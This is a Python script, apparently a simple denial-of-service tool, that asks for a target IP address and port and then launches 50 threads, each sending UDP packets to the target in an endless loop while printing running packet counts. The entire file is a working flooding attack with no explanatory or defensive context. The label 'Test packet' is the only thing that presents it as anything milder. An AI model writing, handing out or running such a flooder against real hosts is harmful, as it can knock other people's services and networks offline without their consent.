import socket
import threading

TARGET_IP = input("TARGET IP: ")
TARGET_PORT = int(input("OPEN PORT: "))
NUM_THREADS = 50

def send_packets():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    count = 0
    while True:
        s.sendto(b"Test packet", (TARGET_IP, TARGET_PORT))
        count += 1
        if count % 100000 == 0:
            print(f"{threading.current_thread().name}: {count} packets sent")

threads = []

for i in range(NUM_THREADS):
    t = threading.Thread(target=send_packets, name=f"-{i+1}")
    t.start()
    threads.append(t)

try:
    for t in threads:
        t.join()
except KeyboardInterrupt:
    print("\nStopped manually (Ctrl+C)")
